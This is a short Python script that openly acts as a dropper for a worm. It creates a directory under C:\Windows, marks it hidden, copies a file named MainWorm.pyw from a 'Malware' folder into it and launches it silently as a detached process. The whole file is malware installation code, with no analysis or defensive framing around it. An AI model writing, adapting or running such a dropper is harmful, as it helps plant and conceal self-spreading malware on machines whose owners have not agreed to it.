import shutil
import os
import subprocess

hidden_folder_path = os.path.expanduser("C:\\Windows\\s142486_WormFolder")
source_file = os.path.expanduser("D:\\Malware\\MainWorm.pyw")
worm_path = os.path.expanduser(f"{hidden_folder_path}\\Worm.pyw")

if not os.path.exists(hidden_folder_path):
    os.makedirs(hidden_folder_path)
os.system(f'attrib +h "{hidden_folder_path}"')

# # Copy the worm to nest it within the system
shutil.copy(source_file, hidden_folder_path)

# Run the worm in the system
with open(worm_path) as file:
    subprocess.Popen(['pyw', worm_path], creationflags=subprocess.DETACHED_PROCESS)